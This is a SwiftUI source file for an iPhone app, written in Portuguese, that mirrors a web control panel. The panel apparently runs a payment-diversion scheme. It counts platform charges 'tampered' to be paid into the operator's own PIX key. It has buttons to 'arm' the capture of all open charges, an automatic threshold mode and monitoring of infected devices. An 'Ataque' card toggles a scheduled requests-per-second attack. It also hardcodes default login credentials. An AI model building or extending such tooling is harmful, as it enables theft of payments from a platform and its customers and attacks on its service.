import SwiftUI
import Foundation

/// Operation panel mirroring https://central-nafavela.pages.dev/painel
/// so the whole thing can be watched and driven from the phone.
struct PainelView: View {
    @AppStorage("painelUser") private var user = "nf"
    @AppStorage("painelSenha") private var senha = "favela"
    @AppStorage("painelKey") private var chave = ""

    @StateObject private var model = PainelModel()
    @State private var showCredentials = false
    @State private var limiar = ""

    var body: some View {
        NavigationStack {
            ScrollView {
                VStack(spacing: 12) {
                    if model.needsCredentials { credenciaisCard }
                    if let error = model.error, !model.needsCredentials { avisoCard(error) }

                    if let estado = model.estado {
                        statusCard(estado)
                        acoesCard(estado)
                        ataqueCard(estado)
                        dinheiroCard(estado)
                        cobrancasCard(estado)
                        guiasCard(estado)
                    } else if model.error == nil {
                        ProgressView("carregando…").padding(.top, 60)
                    }
                }
                .padding(12)
                .padding(.bottom, 20)
            }
            .background(PainelStyle.fundo.ignoresSafeArea())
            .navigationTitle("Painel")
            .navigationBarTitleDisplayMode(.inline)
            .toolbar {
                ToolbarItemGroup(placement: .navigationBarTrailing) {
                    Button {
                        model.autoRefresh.toggle()
                    } label: {
                        Image(systemName: model.autoRefresh ? "arrow.clockwise.circle.fill" : "arrow.clockwise.circle")
                    }
                    .accessibilityLabel("Auto 15s")
                    Button {
                        showCredentials = true
                    } label: {
                        Image(systemName: "key")
                    }
                }
            }
            .refreshable { await carregar() }
            .task(id: model.autoRefresh) { await acompanhar() }
            .sheet(isPresented: $showCredentials) { credenciaisSheet }
            .onChange(of: model.estado?.limiar) { value in
                if let value, limiar.isEmpty { limiar = String(format: "%.2f", Double(value) / 100) }
            }
        }
        .preferredColorScheme(.dark)
    }

    // MARK: Cards

    private func statusCard(_ estado: PainelEstado) -> some View {
        CardBox(title: "Status") {
            HStack(spacing: 10) {
                Text(model.statusLabel)
                    .font(.headline)
                    .padding(.horizontal, 12)
                    .padding(.vertical, 6)
                    .background(model.cor, in: Capsule())
                    .foregroundStyle(.black)
                Text(model.statusExplain).font(.footnote).foregroundStyle(.secondary)
            }
            HStack(spacing: 10) {
                Text(model.syncText).font(.caption).foregroundStyle(.secondary)
                Button("conferir agora") { acao(["sync": "1"], "sincronizando") }
                    .font(.caption)
                    .buttonStyle(.bordered)
                    .tint(PainelStyle.azul)
                if let quando = estado.resumo?.adulteradas, quando > 0 {
                    Text("\(quando) paga(s) pelo SEU pix hoje")
                        .font(.caption.weight(.bold))
                        .foregroundStyle(PainelStyle.verde)
                }
            }
            if let error = estado.diag?.erro_kv, error.contains("exceeded") {
                Text("base de dados no limite diário — dados podem estar atrasados")
                    .font(.caption).foregroundStyle(PainelStyle.laranja)
            }
            if let erro = estado.erro_estado {
                Text(erro).font(.caption2.monospaced()).foregroundStyle(.secondary)
            }
        }
    }

    private func acoesCard(_ estado: PainelEstado) -> some View {
        CardBox(title: "Ações") {
            HStack(spacing: 12) {
                VStack(alignment: .leading, spacing: 2) {
                    Text("aberto agora").font(.caption2).foregroundStyle(.secondary)
                    Text(PainelModel.brl(estado.pendentes_valor))
                        .font(.title3.weight(.bold))
                        .foregroundStyle(PainelStyle.azul)
                }
                VStack(alignment: .leading, spacing: 2) {
                    Text("cobranças").font(.caption2).foregroundStyle(.secondary)
                    Text("\(estado.pendentes_n ?? 0)").font(.title3.weight(.bold))
                }
                VStack(alignment: .leading, spacing: 2) {
                    Text("aparelhos on").font(.caption2).foregroundStyle(.secondary)
                    Text("\(estado.guias_online ?? 0)/\(estado.guias_total ?? 0)").font(.title3.weight(.bold))
                }
                Spacer()
            }

            Button {
                acao(["armado": estado.armado == true ? "0" : "1"], "armando")
            } label: {
                Text(estado.armado == true ? "DESARMAR (voltar ao normal)" : "ARMAR — pegar tudo que está aberto")
                    .font(.footnote.weight(.bold))
                    .frame(maxWidth: .infinity)
            }
            .buttonStyle(.borderedProminent)
            .tint(estado.armado == true ? PainelStyle.verde : PainelStyle.laranja)

            HStack(spacing: 8) {
                Button {
                    acao(["auto": estado.auto == true ? "0" : "1"], "alternando automático")
                } label: {
                    Text(estado.auto == true ? "AUTOMÁTICO LIGADO" : "Ligar modo inteligente")
                        .font(.caption.weight(.bold))
                        .frame(maxWidth: .infinity)
                }
                .buttonStyle(.borderedProminent)
                .tint(estado.auto == true ? PainelStyle.verde : Color.gray)

                TextField("R$ limiar", text: $limiar)
                    .keyboardType(.decimalPad)
                    .textFieldStyle(.roundedBorder)
                    .frame(width: 90)
                    .font(.caption)
                Button("Salvar") {
                    let value = Double(limiar.replacingOccurrences(of: ",", with: ".")) ?? 0
                    if value > 0 { acao(["limiar": String(Int(value * 100))], "salvando limiar") }
                }
                .font(.caption)
                .buttonStyle(.bordered)
            }
            Text("aplica seu pix sozinho só em cobrança única acima do limiar")
                .font(.caption2).foregroundStyle(.secondary)
        }
    }

    private func ataqueCard(_ estado: PainelEstado) -> some View {
        let ataque = estado.atk
        return CardBox(title: "Ataque") {
            HStack(spacing: 8) {
                Button {
                    acao(["forcar": ataque?.ligado == true ? "0" : "1"], "ataque")
                } label: {
                    Text(ataque?.ligado == true ? "ATAQUE LIGADO" : "ATAQUE DESLIGADO")
                        .font(.caption.weight(.bold)).frame(maxWidth: .infinity)
                }
                .buttonStyle(.borderedProminent)
                .tint(ataque?.ligado == true ? PainelStyle.laranja : Color.gray)

                Button {
                    acao(["agenda": ataque?.agenda == true ? "0" : "1"], "modo horário")
                } label: {
                    Text(ataque?.agenda == true ? "MODO HORARIO LIGADO" : "MODO HORARIO DESLIGADO")
                        .font(.caption.weight(.bold)).frame(maxWidth: .infinity)
                }
                .buttonStyle(.borderedProminent)
                .tint(ataque?.agenda == true ? PainelStyle.azul : Color.gray)
            }
            Text("\(ataque?.janelaTxt ?? "sem janela") · agora está \(ataque?.dentro == true ? "DENTRO" : "FORA") do horário · força: \(ataque?.rps ?? 0)/s")
                .font(.caption2).foregroundStyle(.secondary)
        }
    }

    private func dinheiroCard(_ estado: PainelEstado) -> some View {
        let resumo = estado.resumo
        return CardBox(title: "Hoje") {
            HStack(spacing: 10) {
                VStack(alignment: .leading, spacing: 2) {
                    Text("PAGAS PELO SEU PIX").font(.caption2).foregroundStyle(.secondary)
                    Text("\(resumo?.adulteradas ?? 0)").font(.title2.weight(.bold)).foregroundStyle(PainelStyle.verde)
                    Text(PainelModel.brl(resumo?.valor_ad)).font(.caption).foregroundStyle(.secondary)
                }
                .frame(maxWidth: .infinity, alignment: .leading)

                VStack(alignment: .leading, spacing: 2) {
                    Text("PAGAS PELA PLATAFORMA").font(.caption2).foregroundStyle(.secondary)
                    Text("\(resumo?.originais ?? 0)").font(.title2.weight(.bold)).foregroundStyle(PainelStyle.azul)
                    Text(PainelModel.brl(resumo?.valor_orig)).font(.caption).foregroundStyle(.secondary)
                }
                .frame(maxWidth: .infinity, alignment: .leading)
            }
            Text("hoje \(resumo?.hoje ?? "-") — zera sozinho depois de 00:00")
                .font(.caption2).foregroundStyle(.secondary)
        }
    }

    private func cobrancasCard(_ estado: PainelEstado) -> some View {
        let lista = estado.ultimas ?? []
        return CardBox(title: "Cobranças abertas") {
            if lista.isEmpty {
                Text("nenhuma cobrança aberta agora").font(.caption).foregroundStyle(.secondary)
            }
            ForEach(lista) { cobranca in
                HStack(alignment: .top) {
                    VStack(alignment: .leading, spacing: 2) {
                        Text(cobranca.guia ?? "guia").font(.footnote)
                        Text("\(cobranca.status ?? "") · \(PainelModel.seen(cobranca)) · \(cobranca.guiaOn == true ? "online" : "offline")")
                            .font(.caption2).foregroundStyle(.secondary)
                    }
                    Spacer()
                    Text(PainelModel.brl(cobranca.valor))
                        .font(.footnote.weight(.semibold))
                        .foregroundStyle(PainelStyle.azul)
                }
            }
        }
    }

    private func guiasCard(_ estado: PainelEstado) -> some View {
        let guias = estado.listaGuias ?? []
        return CardBox(title: "Guias (\(estado.guias_total ?? guias.count))") {
            ForEach(guias) { guia in
                HStack(alignment: .top) {
                    VStack(alignment: .leading, spacing: 2) {
                        HStack(spacing: 5) {
                            Text(guia.nome ?? "guia sem nome").font(.footnote).lineLimit(1)
                            if guia.excluido == true {
                                Text("FIXO NORMAL").font(.caption2.weight(.bold)).foregroundStyle(.red)
                            }
                        }
                        Text(guia.online == true ? "online" : "visto \(guia.min ?? 0) min atrás")
                            .font(.caption2).foregroundStyle(.secondary)
                    }
                    Spacer()
                    Button(guia.excluido == true ? "liberar" : "fixar normal") {
                        guard let sub = guia.sub else { return }
                        acao(guia.excluido == true ? ["liberar": sub] : ["excluir": sub], "guia")
                    }
                    .font(.caption)
                    .buttonStyle(.bordered)
                }
            }
        }
    }

    // MARK: Credentials

    private var credenciaisCard: some View {
        CardBox(title: "Entrar no painel") {
            Text("Usuário ou senha errados. Corrija abaixo (padrão nf / favela).")
                .font(.caption).foregroundStyle(PainelStyle.laranja)
            credenciaisCampos
            Button("Entrar") { Task { await carregar() } }
                .font(.footnote.weight(.bold))
                .buttonStyle(.borderedProminent)
                .tint(PainelStyle.laranja)
        }
    }

    private var credenciaisSheet: some View {
        NavigationStack {
            Form {
                Section {
                    credenciaisCampos
                } header: {
                    Text("Acesso ao painel")
                } footer: {
                    Text("Mesmo usuário e senha do painel web. A chave só é usada se o site exigir (`k=` no _ctl).")
                }
            }
            .navigationTitle("Credenciais")
            .navigationBarTitleDisplayMode(.inline)
            .toolbar {
                ToolbarItem(placement: .confirmationAction) {
                    Button("Pronto") { showCredentials = false }
                }
            }
        }
    }

    private var credenciaisCampos: some View {
        Group {
            TextField("Usuário", text: $user)
                .textInputAutocapitalization(.never)
                .autocorrectionDisabled()
            SecureField("Senha", text: $senha)
            TextField("Chave do _ctl (opcional)", text: $chave)
                .textInputAutocapitalization(.never)
                .autocorrectionDisabled()
        }
    }

    private func avisoCard(_ texto: String) -> some View {
        CardBox(title: "Aviso") {
            Text(texto).font(.footnote).foregroundStyle(PainelStyle.laranja)
            Button("tentar de novo") { Task { await carregar() } }
                .font(.caption)
                .buttonStyle(.bordered)
        }
    }

    // MARK: Plumbing

    private func carregar() async {
        await model.load(user: user, password: senha, secret: chave)
        if limiar.isEmpty, let value = model.estado?.limiar {
            limiar = String(format: "%.2f", Double(value) / 100)
        }
    }

    private func acompanhar() async {
        guard model.autoRefresh else {
            await carregar()
            return
        }
        while !Task.isCancelled {
            await carregar()
            do { try await Task.sleep(nanoseconds: 15_000_000_000) } catch { return }
        }
    }

    private func acao(_ params: [String: String], _ label: String) {
        Task { await model.action(params, label: label, user: user, password: senha, secret: chave) }
    }
}

// MARK: Style

enum PainelStyle {
    static let laranja = Color(red: 1.0, green: 0.42, blue: 0.0)   // #ff6a00
    static let verde = Color(red: 0.19, green: 0.85, blue: 0.48)
    static let azul = Color(red: 0.5, green: 0.65, blue: 1.0)
    static let fundo = Color(red: 0.055, green: 0.06, blue: 0.075)
    static let card = Color(red: 0.09, green: 0.10, blue: 0.125)
    static let borda = Color.white.opacity(0.09)
}

private extension PainelModel {
    /// Pill colour for the current status.
    var cor: Color {
        switch statusLabel {
        case "ARMADO": return PainelStyle.laranja
        case "AUTOMÁTICO": return PainelStyle.verde
        case "SEM DADOS": return .gray
        default: return Color.white.opacity(0.35)
        }
    }
}

private struct CardBox<Content: View>: View {
    let title: String
    @ViewBuilder var content: Content

    var body: some View {
        VStack(alignment: .leading, spacing: 10) {
            Text(title.uppercased())
                .font(.caption2.weight(.semibold))
                .foregroundStyle(.secondary)
            content
        }
        .frame(maxWidth: .infinity, alignment: .leading)
        .padding(14)
        .background(PainelStyle.card, in: RoundedRectangle(cornerRadius: 14))
        .overlay(RoundedRectangle(cornerRadius: 14).strokeBorder(PainelStyle.borda))
    }
}
